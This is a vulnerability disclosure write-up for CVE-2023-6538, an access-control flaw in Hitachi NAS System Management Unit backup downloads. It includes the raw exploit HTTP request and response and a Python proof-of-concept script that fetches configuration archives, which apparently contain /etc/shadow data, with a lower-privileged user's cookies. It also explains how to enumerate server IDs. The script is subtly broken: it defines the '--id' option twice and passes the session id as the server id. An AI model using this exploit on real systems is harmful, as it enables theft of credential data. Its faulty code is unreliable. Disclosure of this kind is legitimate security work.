## CVE-2023-6538
`CVE-2023-6538` is an *Insecure Direct Object Reference* (**IDOR**) in 
vulnerability found in Hitachi NAS' (`HNAS`') *System Management Unit* (`SMU`) 
`Configuration Backup & Restore` functionality. This vulnerability affects 
`SMU` versions prior to `14.8.7825.01`.

## Exploitation
This exploit requires the attacker to have control over the credentials of a 
user account that is not `Read-Only` or `Global Administrator`, i.e.:
- `Storage Administrator`
- `Server Administrator`
- `Server + Storage Administrator`

By design, users with the `Global Administrator` role should be able to access 
`SMU`'s `Configuration Backup & Restore` functionality, located at 
`https://<HOSTNAME/FQDN/IP>/mgr/app/template/simple%2CDownloadConfigScreen.vm?serverid=1` 
and send the following request, which would create and download the backup of 
the selected server's (i.e. a server that is connected to the `SMU`) 
configuration:

```
GET /mgr/app/template/simple%2CDownloadConfigScreen.vm?serverid=1 HTTP/1.1
Host: REDACTED
Cookie: JSESSIONID=REDACTED; JSESSIONIDSSO=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://REDACTED/mgr/app/action/serveradmin.ConfigRestoreAction/eventsubmit_doperform/ignored
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```

If the request is successful, the `SMU` responds with the following response 
and starts the download of `registry_data.tgz`:

```
HTTP/1.1 200 
Cache-Control: PRIVATE
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Strict-Transport-Security: max-age=31536000;includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
P3P: CP="NOI DSP CUR ADMa DEVa TAIa OUR BUS IND UNI COM NAV INT"
Pragma: cache
Content-Disposition: attachment;filename=registry_data.tgz
Content-Type: application/download
Content-Length: 3169247
Date: Fri, 14 Apr 2023 09:30:03 GMT
Connection: close
Server: SMU

[DATA]
```
However, due to an oversight in `SMU`'s business logic, an attacker with 
access to a `Storage Administrator`, `Server Administrator` or 
`Server + Storage Administrator` account can update the `JSESSIONID` and 
`JSESSIONIDSSO` cookies to match the cookies of the user that they are in 
possession of, allowing them to download the configuration archive. 
Additionally, the attacker can also update the `serverid` parameter in the 
request to enumerate and download the configuration archive of different 
servers connected to the `SMU`.

Thus, a script like `CVE-2023-6538.py` could be used to exploit this 
vulnerability:

```python
#!/usr/bin/python3
#
# Title:            Hitachi NAS (HNAS) System Management Unit (SMU) Configuration Backup & Restore IDOR Vulnerability 
# CVE:              CVE-2023-6538
# Date:             2023-12-13
# Exploit Author:   Arslan Masood (@arszilla)
# Vendor:           https://www.hitachivantara.com/
# Version:          < 14.8.7825.01
# Tested On:        13.9.7021.04     

import argparse
from os import getcwd

import requests

parser = argparse.ArgumentParser(
    description="CVE-2023-6538 PoC",
    usage="./CVE-2023-6538.py --host <Hostname/FQDN/IP> --id <JSESSIONID> --sso <JSESSIONIDSSO>"
    )

# Create --host argument:
parser.add_argument(
    "--host",
    required=True,
    type=str,
    help="Hostname/FQDN/IP Address. Provide the port, if necessary, i.e. 127.0.0.1:8443, example.com:8443"
    )

# Create --id argument:
parser.add_argument(
    "--id",
    required=True,
    type=str,
    help="JSESSIONID cookie value"
    )

# Create --sso argument:
parser.add_argument(
    "--sso",
    required=True,
    type=str,
    help="JSESSIONIDSSO cookie value"
    )

# Create --id argument:
parser.add_argument(
    "--id",
    required=True,
    type=str,
    help="Server ID value"
    )

args = parser.parse_args()

def download_file(hostname, jsessionid, jsessionidsso, serverid):
    # Set the filename:
    filename = "registry_data.tgz"

    # Vulnerable SMU URL:
    smu_url = f"https://{hostname}/mgr/app/template/simple%2CDownloadConfigScreen.vm?serverid={serverid}"

    # GET request cookies
    smu_cookies = {
        "JSESSIONID":       jsessionid,
        "JSESSIONIDSSO":    jsessionidsso
        }

    # GET request headers:
    smu_headers = {
        "User-Agent":                   "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept":                       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":              "en-US,en;q=0.5",
        "Accept-Encoding":              "gzip, deflate",
        "Dnt":                          "1",
        "Referer":                      f"https://{hostname}/mgr/app/action/serveradmin.ConfigRestoreAction/eventsubmit_doperform/ignored",
        "Upgrade-Insecure-Requests":    "1",
        "Sec-Fetch-Dest":               "document",
        "Sec-Fetch-Mode":               "navigate",
        "Sec-Fetch-Site":               "same-origin",
        "Sec-Fetch-User":               "?1",
        "Te":                           "trailers",
        "Connection":                   "close"
        }

    # Send the request:
    with requests.get(smu_url, headers=smu_headers, cookies=smu_cookies, stream=True, verify=False) as file_download:
        with open(filename, 'wb') as backup_archive:
            # Write the zip file to the CWD:
            backup_archive.write(file_download.content)

    print(f"{filename} has been downloaded to {getcwd()}")

if __name__ == "__main__":
    download_file(args.host, args.id, args.sso, args.id)
```

The justification of the CVSS v3.1 score of 7.6 could be further understood by 
examining `registry_data.tgz`:

```
$ tree -a
.
├── backup.properties
├── registry5.11.db1
├── registry5.13.db1
├── registry5.14.db1
├── registry5.15.db1
├── registry5.1.db1
├── registry5.2.db1
├── registry5.3.db1
├── registry5.4.db1
├── registry5.5.db1
├── registry5.6.db1
├── registry5.7.db1
├── registry5.8.db1
└── registry5.db1

1 directory, 14 files
```

The `.tgz` archive contains various settings and information about the server 
that is connected to the `SMU`:

![registry5][registry5]

As seen in the redacted image above, `registry5.db1` contains the contents 
of `/etc/shadow` (which was found via regex) of the selected server.

## Notes
This vulnerability is a "sister vulnerability" to 
[CVE-2023-5808][CVE-2023-5808].

## References
- [CVE-2023-5808][CVE-2023-5808]
- [CVE-2023-6538][CVE-2023-6538]
- [Hitachi Vantara Security Bulletin for CVE-2023-6538][Hitachi Vantara Security Bulletin]

## Timeline
- 2020-04-12 - Vulnerability discovered
- 2023-04-20 - Vulnerability reported to security.vulnerabilities@hitachivantara.com
- 2023-08-11 - Initial CVE number assignment
- 2023-12-06 - CVE numbers re-assigned
- 2023-12-11 - CVE numbers re-assigned
- 2023-12-11 - CVE published
- 2023-12-13 - Public disclosure

[registry5]:                            ./images/registry5.png
[CVE-2023-5808]:                        https://www.cve.org/CVERecord?id=CVE-2023-5808
[CVE-2023-6538]:                        https://www.cve.org/CVERecord?id=CVE-2023-6538
[Hitachi Vantara Security Bulletin]:    https://knowledge.hitachivantara.com/Security/System_Management_Unit_(SMU)_versions_prior_to_14.8.7825.01%2C_used_to_manage_Hitachi_Vantara_NAS_products_is_susceptible_to_unintended_information_disclosure_via_unprivileged_access_to_SMU_configuration_backup_data.
